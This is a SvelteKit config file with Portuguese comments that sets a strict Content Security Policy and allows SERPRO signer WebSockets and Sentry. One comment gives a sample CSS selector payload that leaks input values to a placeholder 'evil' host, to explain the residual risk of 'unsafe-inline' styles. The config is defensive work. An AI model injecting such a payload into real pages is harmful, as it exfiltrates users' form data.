import adapter from '@sveltejs/adapter-cloudflare';

/**
 * URLs WebSocket do assinador SERPRO usadas pelo Web PKI no cliente.
 * Devem aparecer no `connect-src` ou o handshake quebra silenciosamente.
 */
const SERPRO_WS = [
	'wss://assinador-desktop.serpro.gov.br:65166',
	'wss://assinador-desktop.serpro.gov.br:65156',
	'wss://assinador-desktop.serpro.gov.br:65500',
	'wss://127.0.0.1:65166',
	'wss://127.0.0.1:65156',
	'wss://127.0.0.1:65500',
	'ws://127.0.0.1:65166',
	'ws://127.0.0.1:65156',
	'ws://127.0.0.1:65500'
];

/** @type {import('@sveltejs/kit').Config} */
const config = {
	kit: {
		adapter: adapter(),

		/**
		 * CSP gerenciada pelo SvelteKit para respostas HTML...
		 * `mode: 'auto'` adiciona automaticamente nonces (SSR) ou hashes (prerender)
		 * para os inline scripts/styles que o próprio framework emite na hidratação,
		 * permitindo que `script-src` seja `'self'` (sem `'unsafe-inline'`) — fecha
		 * a porta para XSS reflexivo via injeção de <script>.
		 *
		 * Sobre `style-src 'unsafe-inline'` (I-4 da auditoria — trade-off consciente):
		 *  Skeleton UI + Tailwind arbitrary values produzem atributos `style="..."`
		 *  em runtime via JS; Svelte componentes injetam `<style>` blocks variados.
		 *  Sem `unsafe-inline`, ambos quebram e a UI fica inutilizável.
		 *
		 *  Tentamos uma versão com `style-src-elem 'self'` apenas, mas requer que
		 *  TODOS os `<style>` emitidos (incluindo Skeleton/Tailwind plugins) tenham
		 *  nonce — fora do controle do SvelteKit. Para upgrade total seria preciso
		 *  migrar para uma engine de CSS-in-JS que emita nonces consistentemente —
		 *  esforço fora do escopo desta auditoria.
		 *
		 *  Risco residual mitigado em camadas: a CSP de scripts continua estrita
		 *  (`script-src 'self'` sem `unsafe-inline`), `object-src 'none'` e
		 *  `frame-src 'none'` fecham vetores correlatos. Stored-XSS de CSS para
		 *  exfiltrar por seletor (`input[value^="a"]{background:url(//evil/a)}`)
		 *  permanece teoricamente possível — depende do atacante conseguir injetar
		 *  HTML, que por sua vez exige um ponto de injeção em `{@html}` (apenas o
		 *  termo, sanitizado via `sanitizeTermoHtml` reforçado em M-8).
		 *
		 * Para respostas NÃO-HTML (`/api/...`, downloads, etc.) a CSP continua sendo
		 * setada manualmente em `src/hooks.server.ts` via `buildCSP`.
		 */
		csp: {
			mode: 'auto',
			directives: {
				'default-src': ['self'],
				'script-src': ['self'],
				'style-src': ['self', 'unsafe-inline'],
				'img-src': ['self', 'data:', 'blob:'],
				'font-src': ['self', 'data:'],
				// O tipo `Source[]` do SvelteKit não enxerga URLs `wss://` como
				// strings válidas, embora aceite em runtime — daí o cast.
				// `*.sentry.io` libera o beacon do Sentry do cliente (hooks.client.ts);
				// sem isto a CSP bloquearia silenciosamente o envio de erros.
				'connect-src': /** @type {any[]} */ (['self', 'https://*.sentry.io', ...SERPRO_WS]),
				'frame-src': ['none'],
				'object-src': ['none'],
				'base-uri': ['self'],
				'form-action': ['self'],
				'block-all-mixed-content': true,
				'upgrade-insecure-requests': true
			}
		}
	}
};

export default config;
